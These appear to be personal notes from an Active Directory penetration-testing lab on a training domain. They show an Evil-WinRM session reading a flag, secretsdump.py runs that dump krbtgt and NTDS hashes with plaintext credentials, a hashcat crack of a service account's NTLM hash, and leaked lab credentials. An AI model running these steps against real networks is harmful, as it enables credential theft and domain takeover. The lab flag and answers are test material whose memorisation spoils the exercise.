*Evil-WinRM* PS C:\Users\solarwindsmonitor\Documents> Get-Content C:\Users\Administrator\Desktop\flag.txt
d0c_pwN_r3p0rt_reP3at!

**Dumping hashes** -
$secretsdump.py INLANEFREIGHT.LOCAL/solarwindsmonitor:'Solar1010'@172.16.5.5 > hashes.txt

$cat hashes.txt | grep -i "krbtgt"
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

**Dump NTDS.dit**

$secretsdump.py INLANEFREIGHT.LOCAL/solarwindsmonitor:'Solar1010'@172.16.5.5 -just-dc-ntlm > all_ntds.hash
$cat all_ntds.hash | grep -i "svc_reporting"
svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140:::

$ echo 'svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140::' > svcreporting.txt
$ hashcat -m 1000 svcreporting.txt rockyou.txt

a6d3701ae426329951cf5214b7531140:Reporter1!

**Checking group membership of svc_reporting**

$evil-winrm -i 172.16.5.5 -u solarwindsmonitor -p 'Solar1010'

*Evil-WinRM* PS C:\Users\solarwindsmonitor\Documents> Get-ADUser -Identity svc_reporting -Properties MemberOf | Select-Object -ExpandProperty MemberOf
CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL


----


Solarwindmonitor creds leaked in description S0lar:S0lar14!
SPN - sts/inlanefreight.local
![[Pasted image 20260126121815.png]]

Lab_adm is a member of domain admins

![[Pasted image 20260126122454.png]]

